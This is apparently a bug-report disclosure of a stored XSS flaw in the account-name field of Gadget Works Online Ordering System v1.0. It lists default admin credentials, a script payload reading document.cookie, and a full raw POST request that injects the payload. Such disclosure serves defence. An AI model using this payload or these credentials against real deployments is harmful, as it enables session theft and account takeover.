# Gadget Works Online Ordering System v1.0 has Stored Cross Site Scripting

BUG_Author: heitaoa999

Vulnerability url: /philosophy/admin/user/controller.php?action=add

POST parameter 'U_NAME' exists Stored Cross Site Scripting

### Steps to reproduce

1. Go to the admin Dashboard

http://localhost/philosophy/admin/login.php

System Admin Access information:

Username: janobe
Password: admin

2. Click on Users and Click on + News and select User

![image](https://github.com/heitaoa999/bug_report/blob/main/pictures/xss1.png)

3. Put Payload into the 'Account Name' parameter.

Payload:<script>alert(document.cookie)</script>

![image](https://github.com/heitaoa999/bug_report/blob/main/pictures/xss2.png)

4. Click on Save

Transmission packet

```
POST /philosophy/admin/user/controller.php?action=add HTTP/1.1
Host: localhost
Content-Length: 133
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/philosophy/admin/user/index.php?view=add
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=erriivuolh0rb2ucknp2nmpolf
Connection: close

deptid=&U_NAME=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&deptid=&U_USERNAME=a&deptid=&U_PASS=b&U_ROLE=Administrator&save=
```

5. Payload will trigger when a user visits on http://localhost/philosophy/admin/user/index.php

![image](https://github.com/heitaoa999/bug_report/blob/main/pictures/xss3.png)
